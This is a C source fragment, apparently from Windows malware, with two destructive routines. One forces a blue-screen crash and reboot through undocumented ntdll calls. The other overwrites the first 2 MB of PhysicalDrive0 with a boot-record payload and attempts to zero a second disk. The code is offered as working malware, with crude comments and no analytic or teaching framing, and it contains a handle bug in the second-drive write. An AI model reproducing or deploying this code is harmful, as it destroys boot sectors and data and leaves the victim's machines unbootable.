int ExpressFuck() {
	// bsod and reboot
	BOOLEAN tmp1; DWORD tmp2;
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
	RtlAdjustPrivilege(19, 1, 0, &tmp1);
	NtRaiseHardError(0xc0000022, 0, 0, 0, 6, &tmp2);
	// ------------ //
	HANDLE token;
	TOKEN_PRIVILEGES privileges;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}


int OverwriteBoot() {
	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 2097152);	// fucking magick. It creates a bigazz 2 mb char array for...
	int code_count = 0;
	for (; code_count < code1_len; code_count++)
		*(bootcode + code_count) = *(code1 + code_count);			// create an MBR payload using that big buffer...

	DWORD wrtMBR;
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", 				// create a handle to disk and...
		GENERIC_ALL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		0, 
		OPEN_EXISTING, 
		0, 0);

	WriteFile(MBR, bootcode, 2097152, &wrtMBR, 0);					// writes the payload. pretty simple, right? 
	CloseHandle(MBR);

	unsigned char *memoverdisk = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 2097152);

	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive1",
		GENERIC_ALL, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		0, 
		OPEN_EXISTING, 
		0, 0);
	if(hDrive == INVALID_HANDLE_VALUE) {
		CloseHandle(hDrive);
		return 1;
	} else {
		WriteFile(MBR, memoverdisk, 2097152, &wrtMBR, 0);
		CloseHandle(memoverdisk);
	}
}
